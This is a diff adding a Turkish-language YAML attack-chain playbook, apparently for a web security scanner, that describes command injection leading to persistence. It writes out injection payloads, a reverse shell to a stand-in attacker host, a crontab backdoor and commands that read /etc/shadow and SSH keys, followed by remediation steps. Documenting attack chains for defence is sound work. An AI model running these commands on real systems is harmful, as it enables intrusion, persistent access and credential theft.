@@ -1,0 +1,33 @@
+# WebSecure Playbook — CMDI → Kalıcı Erişim (Persistence) Zinciri
+name: "CMDI → Kalıcı Erişim (Reverse Shell + Crontab)"
+chain_id: "cmdi_persistence_chain"
+severity: "Critical"
+confidence: "High"
+priority: 6
+
+required_types:
+  - cmdi
+
+steps:
+  - type: cmdi
+    label: "OS Command Injection"
+    description: >
+      Kullanıcı girdisi doğrudan shell komutuna iletiliyor.
+      Payload: `; id` veya `| whoami` veya `$(curl attacker.com/shell.sh|bash)`.
+      Sunucuda keyfi OS komutu çalıştırılabiliyor.
+
+impact: >
+  CMDI üzerinden reverse shell kurulur, crontab'a kalıcı backdoor eklenir.
+  Saldırgan sunucuya her an yeniden bağlanabilir.
+  Lateral movement için iç ağ keşfi yapılır.
+  Adımlar:
+    1. Reverse shell: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`
+    2. Kalıcılık: `echo "*/5 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1" | crontab -`
+    3. Credential toplama: `cat /etc/passwd /etc/shadow ~/.ssh/id_rsa`
+
+remediation: |
+  1. Kullanıcı girdisini hiçbir zaman shell komutuna geçirmeyin.
+  2. subprocess kullanıyorsanız shell=False ile çalıştırın.
+  3. Outbound ağ erişimini güvenlik duvarıyla kısıtlayın.
+  4. Minimum ayrıcalıklı uygulama kullanıcısı kullanın (www-data, appuser).
+  5. seccomp / AppArmor ile sistem çağrısı kısıtlaması uygulayın.
